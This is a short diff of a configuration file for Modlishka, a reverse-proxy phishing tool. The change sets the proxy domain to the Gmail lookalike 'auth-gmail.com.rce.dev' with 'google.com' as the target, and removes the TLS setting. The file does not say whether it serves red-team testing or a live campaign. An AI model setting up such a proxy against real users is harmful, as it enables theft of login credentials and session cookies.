@@ -1,5 +1,5 @@
 {
-  "proxyDomain": "loopback.modlishka.io",
+  "proxyDomain": "auth-gmail.com.rce.dev",
   "listeningAddress": "0.0.0.0",
   "proxyAddress": "",
   "target": "google.com",
@@ -9,7 +9,6 @@
   "terminateRedirectUrl": "",
   "trackingCookie": "ident",
   "trackingParam": "ident",
-  "useTls": true,
   "jsRules":"",
   "debug": false,
   "forceHTTPS": false,
